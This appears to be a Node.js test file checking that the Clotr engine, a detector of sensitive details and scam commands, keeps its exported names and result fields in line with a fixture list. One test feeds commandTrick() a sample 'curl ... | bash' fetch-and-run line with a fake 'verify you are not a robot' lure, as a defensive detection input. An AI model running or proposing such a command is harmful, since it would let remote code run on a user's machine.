// The engine's interface (apps/engine/docs/interface.md): the package's exports, ClotrHost's methods and the names on
// globalThis.Clotr, with the fields of what each one returns. Each is compared with tests/fixtures/engine-interface.json,
// so a name or a field that's added, dropped or renamed fails here until the list changes with it. Changing the list
// is the decision to change the interface.
"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const vm = require("node:vm");
const { pathToFileURL } = require("node:url");
const { build, split } = require("../tools/engine-bundle.js");

const ROOT = path.join(__dirname, "..");
const ENGINE = path.join(ROOT, "apps", "engine");
const LIST = require("./fixtures/engine-interface.json");
const PAGE = path.join(ENGINE, "docs", "interface.md");
// Counts who reads each name across the apps' sources. It stays in this repo, so the public copy skips that check.
const NAMES = path.join(ROOT, "tools", "engine-names.js");

const BUNDLE = build().text;
const SALT = "0123456789abcdef0123456789abcdef";
const TEXT = "key AKIA4HPQ7XZ2R6TWLJ3N call 555-555-5636";
const ASKED = "the code they texted me is 482913"; // a password result that says which code was asked for
// Holds the clock still and adds a rule that uses up the whole time limit, so detect() stops early and says so.
const STALL = `;(() => {
  let now = Date.now();
  Date.now = () => now;
  Clotr.PATTERNS.push({ id: "test_stalled", severity: "low", name: "stalled",
    find: () => ((now += Clotr.DETECT_BACKSTOP_MS + 200), []) });
})();
`;

const keysOf = (...items) => [...new Set(items.flatMap((x) => Object.keys(x)))];
// An array's own fields besides its items (detect()'s `truncated`).
const flagsOf = (...arrays) => [...new Set(arrays.flatMap((a) => Object.keys(a).filter((k) => !/^\d+$/.test(k))))];

function same(actual, listed, what) {
  const added = actual.filter((n) => !listed.includes(n));
  const dropped = listed.filter((n) => !actual.includes(n));
  assert.ok(
    !added.length && !dropped.length,
    `${what} changed (added: ${added.join(", ") || "none"}; dropped: ${dropped.join(", ") || "none"}). If that's ` +
      "meant, change tests/fixtures/engine-interface.json and apps/engine/docs/interface.md with it.",
  );
}

// The package as someone who installed it gets it: its own files in a temp folder, with the bundle built beside them.
const temps = [];
function installed(extra = "") {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "clotr-engine-interface-"));
  temps.push(dir);
  for (const f of ["index.cjs", "index.mjs", "index.d.ts", "package.json"]) {
    fs.copyFileSync(path.join(ENGINE, f), path.join(dir, f));
  }
  fs.mkdirSync(path.join(dir, "dist"));
  fs.writeFileSync(path.join(dir, "dist", "clotr-engine.js"), BUNDLE + extra);
  return dir;
}
test.after(() => temps.forEach((dir) => fs.rmSync(dir, { recursive: true, force: true })));

// The bundle in a bare context, the way Clotr's apps load it.
function loaded(extra = "") {
  const context = vm.createContext({ console: Object.freeze({ info() {} }) });
  vm.runInContext(BUNDLE + extra, context);
  return context;
}

test("the package exports the names on the list, and its results carry the fields on the list", async () => {
  const dir = installed();
  const pkg = require(path.join(dir, "index.cjs"));
  const esm = await import(pathToFileURL(path.join(dir, "index.mjs")).href);
  same(Object.keys(pkg), LIST.package.exports, "The package's exports (CommonJS)");
  same(Object.keys(esm), LIST.package.exports, "The package's exports (ES module)");
  same(keysOf(...pkg.PATTERNS), LIST.package.rule, "A rule's fields in PATTERNS");

  const found = pkg.detect(TEXT);
  const asked = pkg.detect(ASKED);
  assert.ok(found.length && asked.some((r) => r.asks), "the samples should find details, one with asks");
  same(keysOf(...found, ...asked), LIST.package.result, "A detect() result's fields");
  const cut = require(path.join(installed(STALL), "index.cjs")).detect(TEXT);
  assert.equal(cut.truncated, true, "the stalled clock should cut the scan short");
  same(flagsOf(found, cut), LIST.package.results, "detect()'s own fields on its array");
});

test("ClotrHost has the methods on the list, and each answer carries the fields on the list", () => {
  const { ClotrHost: host } = loaded();
  same(Object.keys(host), LIST.host.methods, "ClotrHost's methods");
  same(Object.keys(host.init({ salt: SALT })), LIST.host.init, "init()'s answer");

  const checked = host.check(TEXT, { app: "com.example.chat" });
  const cut = loaded(STALL).ClotrHost.check(TEXT, { app: "com.example.chat" });
  assert.equal(cut.truncated, true, "the stalled clock should cut the check short");
  same(keysOf(checked, cut), LIST.host.check, "check()'s answer");
  same(keysOf(...checked.findings), LIST.host.finding, "A finding's fields");
  same(Object.keys(checked.words), LIST.host.words, "check()'s words");

  const events = host.eventsFor(checked.findings, "redacted", "com.example.chat", TEXT);
  assert.equal(events.length, checked.findings.length, "each finding should make one History row");
  same(keysOf(...events), LIST.host.event, "A History row's fields");

  const answers = [{ method: "check", args: [TEXT] }, { method: "nothing" }].map((r) => JSON.parse(host.call(r)));
  same(keysOf(...answers), LIST.host.call, "call()'s answers");
});

test("globalThis.Clotr holds the names on the list, each set by the file the list names", () => {
  // Each part of the bundle on its own, to see which file sets which name.
  const context = vm.createContext({ console: Object.freeze({ info() {} }) });
  const setBy = {};
  for (const part of split(BUNDLE)) {
    const before = new Set(Object.keys(vm.runInContext("globalThis.Clotr || {}", context)));
    const json = /\/messages\.json$/.test(part.path);
    vm.runInContext(json ? `(globalThis.ClotrMessages ||= {}).x = ${part.text};` : part.text, context);
    const added = Object.keys(context.Clotr || {}).filter((n) => !before.has(n));
    if (added.length) setBy[part.path] = added;
  }
  // overlapChecks is set by the first detect() on text longer than one window.
  const before = new Set(Object.keys(context.Clotr));
  context.Clotr.detect("x".repeat(context.Clotr.DETECT_WINDOW_CHARS + 1));
  setBy["extension/detector.js"].push(...Object.keys(context.Clotr).filter((n) => !before.has(n)));

  same(Object.keys(setBy), Object.keys(LIST.clotr.setBy), "The files that set names on globalThis.Clotr");
  for (const [file, names] of Object.entries(setBy)) {
    same(names, LIST.clotr.setBy[file] || [], `The names ${file} sets on globalThis.Clotr`);
  }
});

test("the names Clotr's apps read from globalThis.Clotr return the fields on the list", () => {
  const { Clotr: C } = loaded();
  const all = Object.values(LIST.clotr.setBy).flat();
  const unknown = LIST.clotr.readByApps.filter((n) => !all.includes(n));
  assert.deepEqual(unknown, [], "the list gives the apps names that globalThis.Clotr doesn't have");
  same(keysOf(...C.PATTERNS), LIST.clotr.rule, "A rule's fields in Clotr.PATTERNS");
  const found = [...C.detect(TEXT), ...C.detect(ASKED)];
  same(
    keysOf(...found).filter((k) => !LIST.clotr.rule.includes(k)),
    LIST.clotr.resultAdds,
    "What Clotr.detect() adds to a rule's fields",
  );
  const cut = loaded(STALL).Clotr.detect(TEXT);
  same(flagsOf(C.detect(TEXT), cut), LIST.clotr.results, "Clotr.detect()'s own fields on its array");
  same(Object.keys(C.noticeWords(C.detect(TEXT))), LIST.clotr.noticeWords, "noticeWords()'s answer");
  const forms = C.generalForms(C.detect("born 03/14/1990, I live at 12 Main Street, Springfield, IL 62704"), "en-US");
  assert.ok(forms.length, "the sample should have a general form");
  same(keysOf(...forms), LIST.clotr.generalForms, "generalForms()'s items");
  const trick = C.commandTrick("curl -s http://x.example/a.sh | bash", "Verify you are not a robot, press Win+R");
  assert.ok(trick, "the sample should be a command trick");
  same(Object.keys(trick), LIST.clotr.commandTrick, "commandTrick()'s answer");
  same(Object.keys(C.Backup), LIST.clotr.Backup, "Clotr.Backup's names");
});

test(
  "Clotr's apps read only the names on globalThis.Clotr the list gives them, and the page says which apps",
  { skip: !fs.existsSync(NAMES) && "the name count isn't in the public repo" },
  () => {
    const { readByApps } = require(NAMES);
    const read = readByApps();
    same(Object.keys(read), LIST.clotr.readByApps, "The names on globalThis.Clotr Clotr's apps read");
    // And the page's "Read by" column names the apps the count finds for each.
    const LABEL = { guard: "Guard", vscode: "VS Code", jetbrains: "JetBrains", android: "Android", windows: "Windows" };
    const section = fs
      .readFileSync(PAGE, "utf8")
      .split(/^## /m)
      .find((s) => s.startsWith("Names Clotr's apps read"));
    const onPage = Object.fromEntries(
      [...section.matchAll(/^\| `([\w$]+)[^`]*` \| ([^|]+) \|/gm)].map((m) => [m[1], m[2].trim().split(", ").sort()]),
    );
    same(Object.keys(onPage), Object.keys(read), "The names in the page's table of names apps read");
    for (const [name, apps] of Object.entries(read)) {
      const labels = apps.map((a) => LABEL[a] ?? a).sort();
      assert.deepEqual(onPage[name], labels, `the page's "Read by" for ${name} should be ${labels.join(", ")}`);
    }
  },
);

test("the interface page names everything on the list", () => {
  // A name counts as named when it's a word inside any code span: `detect(text)`, or a field in `{ lead, items }`.
  const code = [...fs.readFileSync(PAGE, "utf8").matchAll(/`([^`\n]+)`/g)].map((m) => m[1]).join("\n");
  const { setBy, readByApps, ...fields } = LIST.clotr;
  const named = [
    ...Object.values(LIST.package).flat(),
    ...Object.values(LIST.host).flat(),
    ...Object.values(setBy).flat(),
    ...readByApps,
    ...Object.values(fields).flat(),
  ];
  const missing = [...new Set(named)].filter((n) => !new RegExp(`(?<![\\w$])${n}(?![\\w$])`).test(code));
  assert.deepEqual(missing, [], "apps/engine/docs/interface.md should name each of these in code");
});
